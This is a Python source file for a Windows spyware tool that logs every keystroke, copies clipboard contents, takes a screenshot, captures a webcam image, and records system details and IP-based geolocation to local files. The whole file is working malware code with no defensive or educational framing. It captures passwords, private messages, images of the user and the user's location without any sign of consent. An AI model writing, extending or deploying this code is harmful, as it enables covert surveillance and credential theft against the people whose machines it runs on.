import cv2
from pynput.keyboard import Key, Listener
import sqlite3
import datetime
import socket
import platform
import win32clipboard
from PIL import ImageGrab
import threading
import time
import os
from threading import Lock
import requests
import json

# Global variables and thread-safe lock
k = []  # Buffer for keystrokes
log_lock = Lock()  # Lock for file writing

# Paths for different logs
CLIPBOARD_LOG_PATH = "clipboard.txt"
KEYLOG_LOG_PATH = "logs.txt"
SYSTEM_INFO_LOG_PATH = "system_info.json"  # JSON file for system info
SCREENSHOT_PATH = "screenshot.png"
WEBCAM_IMAGE_PATH = "webcam_capture.jpg"  # Path for webcam image

# Records keystrokes and stores them in a text file
def on_press(key):
    with log_lock:
        # Append the key without any timestamp
        k.append(str(key).replace("'", ""))  # Clean up key format

def write_file():
    while True:
        time.sleep(10)  # Write keystrokes every 10 seconds
        with log_lock:
            if k:  # Write only if there's something in the buffer
                with open(KEYLOG_LOG_PATH, "a") as f:
                    f.write(' '.join(k) + "\n")
                k.clear()  # Clear the buffer after writing

def on_release(key):
    if key == Key.esc:  # Stop the listener when Esc is pressed
        return False

def screenshot():
    try:
        im = ImageGrab.grab()
        im.save(SCREENSHOT_PATH)
        print(f"Screenshot saved to {SCREENSHOT_PATH}")
    except Exception as e:
        print(f"Error taking screenshot: {str(e)}")

def copy_clipboard():
    current_date = datetime.datetime.now()
    with log_lock:
        with open(CLIPBOARD_LOG_PATH, "a") as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                f.write(f"\nDate and time: {current_date}\nClipboard data: \n{pasted_data}\n")
            except Exception as e:
                f.write(f"Error accessing clipboard: {str(e)}\n")

def get_geolocation():
    try:
        response = requests.get('https://ipinfo.io/json')  # Fetch location via IP
        geo_info = response.json()
        
        location = geo_info.get('loc', 'N/A')  # Latitude and Longitude
        latitude, longitude = location.split(',') if location != 'N/A' else ('N/A', 'N/A')

        geo_info_extended = {
            'City': geo_info.get('city', 'N/A'),
            'Region': geo_info.get('region', 'N/A'),
            'Country': geo_info.get('country', 'N/A'),
            'Latitude': latitude,
            'Longitude': longitude,
            'ISP': geo_info.get('org', 'N/A'),
            'Public IP': geo_info.get('ip', 'N/A'),
        }

        return geo_info_extended

    except Exception as e:
        return {"Error": str(e)}

def log_system_info():
    try:
        date = str(datetime.date.today())
        ip_address = socket.gethostbyname(socket.gethostname())
        processor = platform.processor()
        system = platform.system()
        release = platform.release()
        host_name = socket.gethostname()

        # Get geo-location info
        geo_info = get_geolocation()

        system_info = {
            'Date': date,
            'IP Address': ip_address,
            'Processor': processor,
            'System': system,
            'Release': release,
            'Host Name': host_name,
            'Geo-location': geo_info
        }

        # Save system info to a JSON file
        with open(SYSTEM_INFO_LOG_PATH, 'w') as f:
            json.dump(system_info, f, indent=4)

        print(f"System information and geo-location logged to {SYSTEM_INFO_LOG_PATH}")

    except Exception as e:
        print(f"Error retrieving system or geo-location information: {str(e)}")

def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)  # 0 is the default webcam

        if not cap.isOpened():
            print("Error: Could not open webcam.")
            return

        ret, frame = cap.read()  # Capture a single frame
        if ret:
            # Save the captured image
            cv2.imwrite(WEBCAM_IMAGE_PATH, frame)
            print(f"Webcam image saved to {WEBCAM_IMAGE_PATH}")
        else:
            print("Error: Could not capture an image from the webcam.")

        # Release the webcam
        cap.release()
        cv2.destroyAllWindows()

    except Exception as e:
        print(f"Error capturing webcam: {str(e)}")

def main():
    # Ensure log files are created if they don't exist
    if not os.path.exists(KEYLOG_LOG_PATH):
        open(KEYLOG_LOG_PATH, 'w').close()
    if not os.path.exists(CLIPBOARD_LOG_PATH):
        open(CLIPBOARD_LOG_PATH, 'w').close()

    # Log system information and geo-location
    log_system_info()

    # Start screenshot, clipboard, and webcam logging in separate threads
    threading.Thread(target=screenshot).start()
    threading.Thread(target=copy_clipboard).start()
    threading.Thread(target=capture_webcam).start()  # Start webcam capture

    # Start batch keystroke logging in a separate thread
    threading.Thread(target=write_file, daemon=True).start()

    # Start key logging
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
